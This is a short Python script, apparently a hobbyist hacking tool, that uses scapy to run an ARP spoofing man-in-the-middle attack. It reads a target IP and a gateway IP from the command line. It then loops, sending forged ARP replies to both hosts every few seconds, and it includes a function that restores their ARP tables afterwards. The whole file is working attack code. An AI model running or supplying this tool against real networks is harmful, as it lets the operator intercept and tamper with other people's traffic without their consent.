import scapy.all as scapy
import optparse
import time


def get_user_inputs():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--targetip", dest="ip1", help="Enter Target IP")
    parse_object.add_option("-p", "--poisonip", dest="ip2", help="Enter Modem IP")

    options = parse_object.parse_args()[0]

    if not options.ip1:
        print("Enter Target IP")
        exit()
    if not options.ip2:
        print("Enter Gateway IP")
        exit()
    return options


def arp_poisoning(ip1, ip2):

    target_mac = get_mac_address(ip1)

    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=target_mac, psrc=ip2)
    scapy.send(arp_response, verbose=False)


def reverse_poisoning(fooled_ip, gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=5)


def get_mac_address(given_ip):
    arp_request_packet = scapy.ARP(pdst=str(given_ip))

    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_packet / arp_request_packet

    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def start_mitm(user_target_ip, user_gateway_ip, packet_number=0):
    while True:
        arp_poisoning(str(user_target_ip), str(user_gateway_ip))
        arp_poisoning(str(user_gateway_ip), str(user_target_ip))
        packet_number += 1
        print("\rSending Packets Count:", packet_number, end="")
        time.sleep(3)

